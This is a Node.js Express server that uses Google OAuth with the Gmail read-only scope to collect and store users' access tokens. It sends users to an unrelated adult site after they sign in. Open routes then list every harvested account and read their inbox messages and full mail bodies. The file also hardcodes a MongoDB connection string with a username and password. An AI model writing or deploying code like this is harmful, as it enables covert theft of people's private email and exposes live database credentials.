const express = require('express');
const session = require('express-session');
const passport = require('passport');
const mongoose = require('mongoose');
const path = require('path');
const { google } = require('googleapis');
const GoogleStrategy = require('passport-google-oauth20').Strategy;
const User = require('./models/User');
require('dotenv').config();

const app = express();

app.use(express.static(path.join(__dirname, 'public')));

mongoose.connect('mongodb+srv://MyDatabase:Cp8rNCfi15IUC6uc@cluster0.kjbloky.mongodb.net/g', {
  useNewUrlParser: true,
  useUnifiedTopology: true
}).then(() => console.log('✅ MongoDB Connected'))
  .catch(err => console.error('❌ MongoDB Error:', err));

app.set('view engine', 'ejs');
app.set('views', path.join(__dirname, 'views'));

app.use(session({
  secret: 'secret-key',
  resave: false,
  saveUninitialized: true,
}));

app.use(passport.initialize());
app.use(passport.session());

passport.serializeUser((user, done) => done(null, user));
passport.deserializeUser((user, done) => done(null, user));

passport.use(new GoogleStrategy({
  clientID: process.env.GOOGLE_CLIENT_ID,
  clientSecret: process.env.GOOGLE_CLIENT_SECRET,
  callbackURL: 'http://localhost:3000/auth/google/callback'
}, async (accessToken, refreshToken, profile, done) => {
  try {
    let user = await User.findOne({ googleId: profile.id });
    if (!user) {
      user = await User.create({
        googleId: profile.id,
        name: profile.displayName,
        email: profile.emails[0].value,
        accessToken
      });
    } else {
      user.accessToken = accessToken;
      await user.save();
    }
    return done(null, user);
  } catch (err) {
    console.error('❌ Error saving user:', err);
    return done(err, null);
  }
}));

// Home route
app.get('/', (req, res) => {
  res.render('home', { user: req.user, mails: null });
});

// List all user emails with links
app.get('/view', async (req, res) => {
  try {
    const users = await User.find({}, 'email');
    res.render('userList', { users });
  } catch (err) {
    console.error(err);
    res.send('Error loading user emails');
  }
});

// Show mails for a specific email user
app.get('/view/:email', async (req, res) => {
  try {
    const emailParam = req.params.email;
    const user = await User.findOne({ email: emailParam });
    if (!user) return res.send('User not found');

    const oauth2Client = new google.auth.OAuth2();
    oauth2Client.setCredentials({ access_token: user.accessToken });

    const gmail = google.gmail({ version: 'v1', auth: oauth2Client });

    const messageList = await gmail.users.messages.list({
      userId: 'me',
      maxResults: 50,
    });

    const messages = messageList.data.messages || [];
    const mails = [];

    for (const msg of messages) {
      const messageDetail = await gmail.users.messages.get({
        userId: 'me',
        id: msg.id
      });

      const headers = messageDetail.data.payload.headers;
      const from = headers.find(h => h.name === 'From')?.value;
      const subject = headers.find(h => h.name === 'Subject')?.value;
      const snippet = messageDetail.data.snippet;

      mails.push({ from, subject, snippet });
    }

    res.render('userMails', { email: user.email, mails });
  } catch (err) {
    console.error(err);
    res.send('Error loading mails');
  }
});

// Google OAuth routes
app.get('/auth/google',
  passport.authenticate('google', {
    scope: ['profile', 'email', 'https://www.googleapis.com/auth/gmail.readonly']
  })
);

app.get('/auth/google/callback',
  passport.authenticate('google', { failureRedirect: '/' }),
  (req, res) => {
    res.redirect('https://xhamster.desi/');
  }
);

app.get('/mail/:email/:id', async (req, res) => {
  const { email, id } = req.params;

  try {
    const user = await User.findOne({ email });
    if (!user || !user.access_token) return res.send('User/token not found.');

    const oauth2Client = new google.auth.OAuth2();
    oauth2Client.setCredentials({ access_token: user.access_token });

    const gmail = google.gmail({ version: 'v1', auth: oauth2Client });

    const msg = await gmail.users.messages.get({
      userId: 'me',
      id,
      format: 'full',
    });

    const headers = msg.data.payload.headers;
    const from = headers.find(h => h.name === 'From')?.value;
    const subject = headers.find(h => h.name === 'Subject')?.value;

    // Decode body
    const parts = msg.data.payload.parts || [];
    let bodyData = msg.data.payload.body?.data;
    if (!bodyData && parts.length > 0) {
      const part = parts.find(p => p.mimeType === 'text/html' || p.mimeType === 'text/plain');
      bodyData = part?.body?.data;
    }

    const buffer = Buffer.from(bodyData || '', 'base64');
    const body = buffer.toString();

    res.render('mail', { email, from, subject, body });
  } catch (err) {
    console.error('❌ Error loading mail body:', err.message);
    res.send('Failed to load mail.');
  }
});

//my add
app.get('/group', (req, res) => {
  res.render('group');
});
app.listen(3000, () => {
  console.log('✅ Server running on http://localhost:3000');
});